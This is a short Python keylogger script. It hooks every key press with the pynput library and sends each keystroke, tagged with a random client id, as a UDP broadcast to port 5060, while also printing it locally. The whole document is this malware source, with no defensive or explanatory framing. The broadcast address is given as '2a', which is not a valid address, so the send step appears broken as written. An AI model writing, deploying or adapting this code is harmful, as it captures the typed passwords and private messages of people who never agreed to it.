import pynput,socket,secrets

clientid=secrets.token_hex(6)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sock.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST,1)

print("run")

broadcast_ip="2a"
broadcast_port=5060

def client(event):
    sock.sendto(f"{clientid} => [{str(event)}]".encode("utf-8"),(broadcast_ip,broadcast_port))
    print(f"{clientid} => [{str(event)}]")

with pynput.keyboard.Listener(on_press=client) as keyboardlogger:
    keyboardlogger.join()
